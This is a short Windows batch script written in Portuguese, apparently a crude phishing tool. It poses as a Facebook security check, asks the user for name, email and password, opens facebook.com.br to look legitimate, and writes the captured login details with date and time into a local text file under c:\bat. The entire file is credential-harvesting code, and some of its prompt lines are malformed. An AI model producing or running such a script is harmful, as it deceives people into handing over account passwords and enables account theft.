echo off 
title Facebook 
cls 
echo.
 echo - Para sua segurança o Facebook esta protegido!
 echo. 
echo - E preciso entrar com seu email e senha de acesso! 
echo. 
set/p nome=Nome: 
set/p us Email: 
set/p pass Email Passwor: 
msg Obrigado voce agora ja pode usar o Facebook. 
start iexplore.exe http://www.facebook.com.br 
echo dia %date% Hora %time% %n% logon no email: %us% Nome: %nome% e password:%pass% >"c:\bat\%n%.txt" 
exit